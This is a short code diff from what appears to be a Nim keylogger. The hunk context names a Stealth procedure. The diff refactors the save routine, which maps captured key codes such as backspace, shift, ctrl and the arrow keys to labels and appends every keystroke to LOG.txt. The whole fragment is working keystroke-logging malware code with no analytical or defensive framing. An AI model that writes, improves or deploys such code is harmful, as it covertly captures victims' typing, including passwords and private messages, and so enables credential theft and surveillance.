@@ -11,22 +11,23 @@ proc Stealth() =
 
 proc save(i: int) =
   var file = open("LOG.txt", fmAppend)
-  case i
-    of 32: write(file, " ")
-    of 8: write(file, "[BACKSPACE]")
-    of 13: write(file, "n")
-    of VK_TAB: write(file, "[TAB]")
-    of VK_SHIFT: write(file, "[SHIFT]")
-    of VK_CONTROL: write(file, "[CTRL]")
-    of VK_ESCAPE: write(file, "[ESC]")
-    of VK_END: write(file, "[END]")
-    of VK_HOME: write(file, "[HOME]")
-    of VK_LEFT: write(file, "[LEFT]")
-    of VK_UP: write(file, "[UP]")
-    of VK_RIGHT: write(file, "[RIGHT]")
-    of VK_DOWN: write(file, "[DOWN]")
-    of 190, 110: write(file, ".")
-    else: write(file, $chr(i))
+  let key = case i
+    of 32: " "
+    of 8: "[BACKSPACE]"
+    of 13: "n"
+    of VK_TAB: "[TAB]"
+    of VK_SHIFT: "[SHIFT]"
+    of VK_CONTROL: "[CTRL]"
+    of VK_ESCAPE: "[ESC]"
+    of VK_END: "[END]"
+    of VK_HOME: "[HOME]"
+    of VK_LEFT: "[LEFT]"
+    of VK_UP: "[UP]"
+    of VK_RIGHT: "[RIGHT]"
+    of VK_DOWN: "[DOWN]"
+    of 190, 110: "."
+    else: $chr(i)
+  write(file, key)
   close(file)
 
 proc main() =
